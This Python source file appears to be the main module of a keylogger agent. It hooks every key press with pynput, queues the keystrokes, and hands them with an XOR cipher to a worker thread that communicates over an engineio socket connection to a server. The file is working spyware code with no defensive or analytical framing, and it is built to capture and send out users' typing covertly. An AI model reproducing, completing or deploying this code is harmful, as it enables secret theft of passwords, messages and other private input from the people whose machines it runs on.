import queue
import sys
import threading

from engineio import Client
from pynput import keyboard

from agent import key_handler
from agent.print_credit import print_welcome
from agent.socket_client import init_socket, reconnect
from agent.worker import do_work
from shared.Encriptor import XorCharCipher

debug = 'debug' in sys.argv # run with "python app.py debug" for local testing

cipher = XorCharCipher(77)

keystrokes_queue = queue.Queue()


def launch(sio: Client):
    print_welcome()

    sio.on('connect', lambda: print('Connected to server'))
    # sio.on('disconnect', lambda x: reconnect() if sio.reason != "exit" else None)

    threading.Thread(
        target=do_work,
        args=(sio, keystrokes_queue, cipher),
        daemon=True
    ).start()

    listener = keyboard.Listener(on_press=lambda k: key_handler.on_key(k, keystrokes_queue))
    listener.start()

    sio.wait()


def main():
    sio = None  # define upfront
    try:
        sio = init_socket(debug)
        launch(sio)
    except KeyboardInterrupt:
        if sio and sio.connected:
            sio.disconnect()
        print("\n\nExiting...")
